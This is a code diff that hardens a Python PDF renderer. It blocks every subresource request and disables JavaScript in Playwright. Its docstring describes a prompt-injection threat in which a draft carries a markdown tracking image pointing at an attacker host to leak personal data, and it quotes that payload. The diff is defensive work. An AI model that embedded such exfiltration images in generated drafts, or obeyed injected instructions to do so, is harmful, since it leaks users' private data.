@@ -25,6 +25,19 @@ class PdfRendererUnavailable(RuntimeError):
     """Raised when no browser engine is available to print PDFs."""
 
 
+def _permit_request(is_navigation_request: bool) -> bool:
+    """Whether the PDF browser engine may issue this request.
+
+    Print HTML has ZERO legitimate subresources — the CSS is inlined and no images/
+    fonts/scripts are referenced — so only the top-document navigation is allowed.
+    Every subresource is blocked, which closes the draft-PDF exfiltration channel: a
+    prompt-injected draft that slipped a tracking image ``![](https://attacker/?d=PII)``
+    past the sanitizer still cannot fetch it (no fetch, no leak). Defense-in-depth with
+    ``bans.strip_exfil_vectors``; neither is trusted alone.
+    """
+    return is_navigation_request
+
+
 def render_to_pdf(url: str) -> bytes:
     """Render the page at ``url`` to PDF bytes via the active transport."""
     service = os.environ.get(PDF_SERVICE_ENV)
@@ -63,11 +76,23 @@ def _render_via_playwright(url: str) -> bytes:
             "`uv run playwright install chromium`."
         ) from exc
 
+    def _guard(route: "object") -> None:
+        # Continue the top-document navigation, abort every subresource.
+        if _permit_request(route.request.is_navigation_request()):  # type: ignore[attr-defined]
+            route.continue_()  # type: ignore[attr-defined]
+        else:
+            route.abort()  # type: ignore[attr-defined]
+
     try:
         with sync_playwright() as p:
             browser = p.chromium.launch()
             try:
-                page = browser.new_page()
+                # JS is disabled (the print HTML needs none) and all subresource loads
+                # are blocked, so a malicious draft can neither fetch a tracking pixel
+                # nor run injected script during render.
+                context = browser.new_context(java_script_enabled=False)
+                context.route("**/*", _guard)
+                page = context.new_page()
                 page.goto(url, wait_until="networkidle")
                 return page.pdf(print_background=True, prefer_css_page_size=True)
             finally:
